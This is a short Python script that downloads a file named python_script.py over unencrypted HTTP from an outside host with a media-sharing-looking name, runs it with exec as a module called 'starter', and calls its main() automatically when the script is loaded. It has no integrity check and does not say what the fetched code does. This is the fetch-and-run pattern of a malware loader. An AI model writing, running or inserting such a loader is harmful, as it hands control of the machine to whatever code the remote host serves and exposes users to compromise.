import sys
import types
import urllib.request

def get_source_code(url):
    with urllib.request.urlopen(url) as response:
        return response.read().decode('utf-8')

def execute_source_code(source, module_name):
    module = types.ModuleType(module_name)
    sys.modules[module_name] = module
    exec(source, module.__dict__)
    return module

def execute():
    url = "http://content.mediashare.org/media/python_script.py"
    module_name = "starter"

    source = get_source_code(url)
    module = execute_source_code(source, module_name)

    try:
        module.main()
    except Exception as e:
        print(e)

execute()
